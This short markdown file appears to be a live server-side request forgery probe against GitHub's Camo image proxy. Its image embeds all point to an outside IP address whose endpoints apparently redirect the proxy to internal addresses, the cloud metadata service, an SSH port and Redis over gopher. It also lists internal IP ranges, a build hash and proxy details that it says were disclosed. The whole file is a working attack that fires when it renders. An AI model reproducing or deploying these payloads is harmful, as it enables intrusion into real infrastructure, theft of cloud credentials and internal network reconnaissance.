# Camo SSRF Testing v73 - Timing Based Tests

## NEW: Timing-based Internal Network Detection
| Test | Endpoint | Purpose |
|------|----------|--------|
| Timing 10.x | ![](http://164.90.187.218:9999/timing1) | Redirect to 10.0.0.1:12345 - timing difference |
| Timing localhost | ![](http://164.90.187.218:9999/timing2) | Redirect to 127.0.0.1:65534 |
| Slow response | ![](http://164.90.187.218:9999/slowresp) | 30 second delay response |

## Previous Tests
| Test | Endpoint | Purpose |
|------|----------|--------|
| Direct IMDS | ![](http://164.90.187.218:9999/quick169) | Single redirect to IMDS |
| Port scan:22 | ![](http://164.90.187.218:9999/portscan?port=22) | SSH port redirect |
| gopher:// | ![](http://164.90.187.218:9999/gophertest) | Redis SSRF |
| Long chain | ![](http://164.90.187.218:9999/longchain?count=0) | 10-hop redirect |

## Info Disclosure Confirmed:
- X-Forwarded-For: Internal IPs (10.48.x, 10.52.x, 10.56.x)
- Via: github-camo build hash, squid/6.2, proxy hostnames

![OK](http://164.90.187.218:9999/ok)
![AWS](http://164.90.187.218:9999/aws)
